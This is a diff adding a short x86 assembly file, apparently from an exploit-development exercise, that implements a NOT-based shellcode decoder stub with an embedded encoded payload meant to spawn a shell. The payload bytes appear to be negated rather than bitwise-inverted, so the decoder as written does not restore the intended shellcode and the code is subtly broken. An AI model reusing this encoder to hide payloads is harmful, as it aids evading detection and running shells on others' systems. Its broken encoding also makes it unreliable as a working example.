@@ -1,0 +1,29 @@
+;Filename:Not-encoder.nasm
+;Author:Prateek Gianchandani		
+;Email: prateek.searchingeye@gmail.com
+
+global _start
+
+section .text
+
+_start:
+	jmp short call_shellcode
+
+
+decoder:
+	pop esi
+	xor ecx, ecx
+	mov cl, 25
+			
+
+decode:
+	not byte [esi]
+	inc esi
+	loop decode
+
+	jmp short EncodedShellcode
+
+call_shellcode:
+	call decoder
+
+	EncodedShellcode: db 0xcf,0x40,0xb0,0x98,0xd1,0xd1,0x8d,0x98,0x98,0xd1,0x9e,0x97,0x92,0x77,0x1d,0xb0,0x77,0x1e,0xad,0x77,0x1f,0x50,0xf5,0x33,0x80
